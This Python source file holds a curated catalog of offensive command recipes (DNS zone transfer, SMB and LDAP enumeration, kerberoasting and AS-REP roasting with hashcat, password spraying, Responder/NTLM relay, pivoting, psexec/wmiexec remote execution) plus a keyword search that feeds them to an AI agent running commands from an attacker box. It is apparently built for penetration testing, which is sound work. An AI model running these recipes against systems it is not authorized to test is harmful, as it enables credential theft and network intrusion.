"""Curated tool-guide catalog for the AI agent — "RAG without embeddings".

The agent's model often doesn't know the exact flags/syntax for the
offensive toolchain on the attacker box (a simple "recon DNS + zone
transfer" confused it). Instead of a vector-store pipeline over man
pages, this is a small curated catalog of task-shaped recipes: the
tool_guide tool retrieves matching entries by keyword, the model reads
the exact commands and runs them via run_command / run_scan.

Bounded domain, curated quality, zero infrastructure — and it stays
honest (search returns only what's actually written here).
"""

from __future__ import annotations

# (topic, aliases/tags, notes, commands)
TOOL_GUIDES: list[dict] = [
    {
        "topic": "dns-recon",
        "aliases": ["dns", "ns", "mx", "soa", "records", "resolve", "dnsenum"],
        "notes": (
            "Basic DNS recon: WHO OWNS the zone (SOA/NS), where mail goes "
            "(MX), what resolves. dig is the workhorse; host/dnsenum for "
            "quick sweeps."
        ),
        "commands": [
            "dig NS {domain} +short",
            "dig SOA {domain} +short",
            "dig MX {domain} +short",
            "dig A {domain} +short",
            "dig ANY {domain} +noall +answer",
            "host -t ns {domain}",
        ],
    },
    {
        "topic": "dns-zone-transfer",
        "aliases": ["axfr", "zone transfer", "zonetransfer", "transfer"],
        "notes": (
            "AXFR against EVERY nameserver from dig NS — transfers only "
            "work against a misconfigured NS that allows the query. Try "
            "each NS in turn; also dnsrecon and the nmap script as "
            "alternatives."
        ),
        "commands": [
            "dig NS {domain} +short | while read ns; do echo \"--- $ns\"; dig AXFR {domain} @$ns +noall +answer; done",
            "dnsrecon -d {domain} -t axfr",
            "nmap --script dns-zone-transfer -p 53 {ns_ip}",
        ],
    },
    {
        "topic": "dns-bruteforce",
        "aliases": ["subdomain", "subdomains", "bruteforce", "subbrute", "wordlist"],
        "notes": "Subdomain enumeration from the attacker box.",
        "commands": [
            "dig axfr {domain} @{ns} +noall +answer  # if AXFR worked, no bruteforce needed",
            "for w in www mail vpn owa dev test api portal; do dig +short $w.{domain}; done",
            "gobuster dns -d {domain} -w /usr/share/wordlists/dnsmap.txt",
        ],
    },
    {
        "topic": "smb-enum",
        "aliases": ["smb", "shares", "samba", "445", "netbios", "null session"],
        "notes": "SMB enumeration: shares, sessions, users — netexec (nxc) is the standard.",
        "commands": [
            "netexec smb {target} -u '' -p '' --shares",
            "netexec smb {target} --users --share",
            "netexec smb {target} -u {username} -p {password} --sam",
            "enum4linux -a {target}",
            "smbclient -L //{target} -N",
        ],
    },
    {
        "topic": "kerberoast",
        "aliases": ["spn", "tgs", "kerberos", "88", "getuserspns"],
        "notes": "Request TGS for SPN accounts, crack offline. Output file must be looted.",
        "commands": [
            "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {dc_ip} -request -outputfile /tmp/kerberoast_{domain}.txt",
            "hashcat -m 13100 /tmp/kerberoast_{domain}.txt /usr/share/wordlists/rockyou.txt",
        ],
    },
    {
        "topic": "as-rep-roast",
        "aliases": ["asrep", "preauth", "getnpusers"],
        "notes": "AS-REP hashes for accounts without Kerberos pre-auth. Needs a users list (/tmp/users.txt from LDAP enum).",
        "commands": [
            "impacket-GetNPUsers '{domain}/' -no-pass -usersfile /tmp/users.txt -dc-ip {dc_ip} -outputfile /tmp/asrep_{domain}.txt",
            "hashcat -m 18200 /tmp/asrep_{domain}.txt /usr/share/wordlists/rockyou.txt",
        ],
    },
    {
        "topic": "password-spray",
        "aliases": ["spray", "lockout", "bruteforce password", "cme spray"],
        "notes": "ONE password per user per window; know the lockout threshold. --no-bruteforce is lockout-safe.",
        "commands": [
            "netexec smb {target} -u /tmp/users.txt -p '{password}' --no-bruteforce --continue-on-success",
            "netexec smb {target} -u {username} -p '{password}' --continue-on-success",
        ],
    },
    {
        "topic": "ldap-enum",
        "aliases": ["ldap", "389", "ad enum", "users list", "groups"],
        "notes": "AD users/groups/computers via LDAP — also builds /tmp/users.txt for AS-REP.",
        "commands": [
            "netexec ldap {dc_ip} -u {username} -p {password} --users --groups --computers --admin-count",
            "netexec ldap {dc_ip} -u {username} -p {password} --users | awk '{print $NF}' | sort -u > /tmp/users.txt",
        ],
    },
    {
        "topic": "web-recon",
        "aliases": ["web", "http", "headers", "vhost", "gobuster", "dirbust"],
        "notes": "Web surface: headers, tech, directories.",
        "commands": [
            "curl -sk -I https://{target}/",
            "whatweb http://{target}/",
            "gobuster dir -u http://{target}/ -w /usr/share/wordlists/dirb/common.txt -t 25",
            "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,401,403",
        ],
    },
    {
        "topic": "bloodhound-collect",
        "aliases": ["bloodhound", "sharphound", "ad graph", "collection"],
        "notes": "Collect AD graph data for attack-path analysis (then import the zip into the platform).",
        "commands": [
            "bloodhound-python -u {username} -p {password} -d {domain} -ns {dc_ip} -c All --zip",
        ],
    },
    {
        "topic": "responder-poisoning",
        "aliases": ["responder", "llmnr", "ntlm relay", "poison", "capture hash"],
        "notes": "LLMNR/NBT-NS poisoning on the segment to capture NetNTLM hashes. OPSEC: visible in logs.",
        "commands": [
            "sudo responder -I {interface} -dwv",
            "ntlmrelayx.py -tf /tmp/targets.txt -smb2support",
        ],
    },
    {
        "topic": "ssh-tunnels",
        "aliases": ["tunnel", "port forward", "pivot", "chisel", "socks"],
        "notes": "Pivots and forwards from the attacker box. The platform's attacker targets support jump/socks natively too.",
        "commands": [
            "ssh -L 8443:{inner_host}:443 {user}@{jump} -N",
            "ssh -D 1080 {user}@{jump} -N",
            "chisel server --reverse -p 8000  # on redirector; client: chisel client {redirector}:8000 R:socks",
        ],
    },
    {
        "topic": "mssql-mysql",
        "aliases": ["mssql", "mysql", "1433", "3306", "database"],
        "notes": "Database access checks with captured creds.",
        "commands": [
            "netexec mssql {target} -u {username} -p {password} --local-auth",
            "impacket-mssqlclient '{domain}/{username}:{password}@{target}' -windows-auth",
            "mysql -h {target} -u {username} -p{password} -e 'select version();'",
        ],
    },
    {
        "topic": "winrm-rdp",
        "aliases": ["winrm", "5985", "rdp", "3389", "psexec", "wmi"],
        "notes": "Remote execution with valid admin creds.",
        "commands": [
            "netexec winrm {target} -u {username} -p {password}",
            "impacket-psexec '{domain}/{username}:{password}@{target}'",
            "impacket-wmiexec '{domain}/{username}:{password}@{target}'",
            "xfreerdp /u:{username} /p:{password} /v:{target} /dynamic-resolution",
        ],
    },
]


def search_tool_guides(query: str, limit: int = 3) -> list[dict]:
    """Keyword search over topic + aliases + notes + commands."""
    q = (query or "").lower().strip()
    if not q:
        return TOOL_GUIDES[:limit]
    tokens = [t for t in q.replace(",", " ").split() if len(t) > 1]
    scored: list[tuple[int, dict]] = []
    for g in TOOL_GUIDES:
        hay = " ".join([g["topic"], " ".join(g["aliases"]), g["notes"], " ".join(g["commands"])]).lower()
        score = sum(1 for t in tokens if t in hay)
        # direct topic/alias hit dominates
        if any(t in g["topic"] or t in " ".join(g["aliases"]) for t in tokens):
            score += 5
        if score:
            scored.append((score, g))
    scored.sort(key=lambda x: -x[0])
    return [g for _, g in scored[:limit]]
